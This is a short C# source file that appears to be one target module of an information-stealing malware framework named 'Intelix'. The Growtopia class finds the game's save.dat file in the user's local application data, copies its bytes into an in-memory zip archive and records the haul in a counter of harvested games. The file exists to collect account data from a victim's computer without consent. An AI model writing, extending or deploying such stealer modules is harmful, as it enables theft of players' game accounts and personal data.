using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Games;

public class Growtopia : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Growtopia", "save.dat");
		if (File.Exists(text))
		{
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Growtopia";
			string text2 = "Growtopia\\save.dat";
			zip.AddFile(text2, File.ReadAllBytes(text));
			counterApplications.Files.Add(text + " => " + text2);
			counter.Games.Add(counterApplications);
		}
	}
}
